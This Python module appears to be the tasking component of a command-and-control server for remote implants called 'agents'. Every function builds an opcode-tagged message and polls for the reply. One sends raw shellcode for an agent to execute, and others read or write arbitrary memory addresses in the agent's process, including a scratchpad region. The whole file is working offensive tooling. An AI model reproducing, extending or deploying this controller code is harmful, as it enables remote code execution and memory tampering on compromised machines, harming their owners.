from models.agent import Agent

import time

responses = {}

def send_and_wait(agent_id, shellcode):
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    from routes.anon.agent import ATTEMPTS
    global responses
    shell_len = len(shellcode).to_bytes(8, byteorder="little")
    shellcode = bytearray(shell_len + shellcode) # Shellcode size
    shellcode.insert(0, 0x01) # Exec
    agent_requests[agent_id] = shellcode
    attempts = ATTEMPTS
    while True:
        attempts = attempts -1
        time.sleep(0.1)
        if agent_id in responses.keys() and responses.get(agent_id) is not None or attempts ==0:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def read_from_agent(agent_id, memory, size):
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    from routes.anon.agent import ATTEMPTS
    global responses
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(size.to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes
    data_blob.insert(0, 0x2) # Read
    agent_requests[agent_id] = data_blob
    attempts = ATTEMPTS
    while True:
        attempts = attempts -1
        time.sleep(0.1)
        if agent_id in responses.keys() and responses.get(agent_id) is not None or attempts ==0:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def read_scratchpad(agent_id, size):
    agent_obj = Agent.by_id(agent_id)
    return read_from_agent(agent_id, agent_obj.scratchpad, size)



def write_to_agent(agent_id, memory, data):
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    from routes.anon.agent import ATTEMPTS
    global responses
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(len(data).to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes + data
    data_blob.insert(0, 0x3) # Write
    agent_requests[agent_id] = data_blob
    attempts = ATTEMPTS
    while True:
        attempts = attempts -1
        time.sleep(0.1)
        if agent_id in responses.keys() and responses.get(agent_id) is not None or attempts ==0:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def write_scratchpad(agent_id, data):
    agent_obj = Agent.by_id(agent_id)
    return write_to_agent(agent_id, agent_obj.scratchpad, data)